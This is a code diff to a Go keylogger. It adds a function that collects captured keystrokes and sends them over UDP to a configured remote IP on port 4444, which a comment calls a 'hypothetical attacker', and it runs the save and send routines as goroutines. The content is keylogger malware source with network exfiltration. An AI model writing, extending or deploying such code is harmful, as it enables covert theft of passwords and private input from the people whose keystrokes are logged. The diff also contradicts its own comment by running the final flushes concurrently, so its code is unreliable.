@@ -1,9 +1,12 @@
 package main
 
 import (
-	//"fmt"
+	"fmt"
 	"io"
+	"net"
 	"os"
+	"strconv"
+	"strings"
 	"syscall"
 	"time"
 )
@@ -222,9 +225,9 @@ func (k *keylogger) start(duration int) {
 
 		if time.Since(lastBufferFlush) > time.Duration(5)*time.Second {
 			if k.mode == 0 {
-				k.saveToFile(&buffer)
+				go k.saveToFile(&buffer)
 			} else if k.mode == 1 {
-				// k.send(currentKeys)
+				go k.sendToHost(&buffer)
 			}
 			lastBufferFlush = time.Now()
 		}
@@ -233,10 +236,11 @@ func (k *keylogger) start(duration int) {
 		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
 	}
 
+	// do not run these final buffer flushes concurrently or they will not finish before the main function returns
 	if k.mode == 0 {
-		k.saveToFile(&buffer)
+		go k.saveToFile(&buffer)
 	} else if k.mode == 1 {
-		// k.send(currentKeys)
+		go k.sendToHost(&buffer)
 	}
 	k.active = false
 
@@ -264,7 +268,9 @@ func (k *keylogger) setMode(mode int, info string) {
 	}
 }
 
+// save buffer to file
 func (k *keylogger) saveToFile(buffer *[]key) {
+	fmt.Println("Doing a write")
 	downEvents := []key{}
 	for _, key := range *buffer {
 		if key.down {
@@ -279,6 +285,40 @@ func (k *keylogger) saveToFile(buffer *[]key) {
 	for _, key := range downEvents {
 		_, err := f.WriteString(key.name + " ")
 		check(err)
+	}
+
+	*buffer = nil
+}
+
+// send buffer data to remote host (hypothetical attacker)
+func (k *keylogger) sendToHost(buffer *[]key) {
+	downEvents := []key{}
+	for _, key := range *buffer {
+		if key.down {
+			downEvents = append(downEvents, key)
+		}
+	}
+
+	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
+	check(err)
+	// defer conn.Close() // does doing this shut off the connected?
+
+	// create string representing the keystrokes from the buffer
+	var dataString string = ""
+	for _, key := range downEvents {
+		dataString += (key.name + " ")
+	}
+
+	// resolve ip address
+	ipSplit := strings.Split(k.ipdst, ".")
+	octet1, _ := strconv.Atoi(ipSplit[0])
+	octet2, _ := strconv.Atoi(ipSplit[1])
+	octet3, _ := strconv.Atoi(ipSplit[2])
+	octet4, _ := strconv.Atoi(ipSplit[3])
+
+	_, err = conn.WriteTo([]byte(dataString), &net.UDPAddr{IP: net.IP{byte(octet1), byte(octet2), byte(octet3), byte(octet4)}, Port: 4444})
+	if err != nil {
+		fmt.Println("Failed to send data:", dataString)
 	}
 
 	*buffer = nil
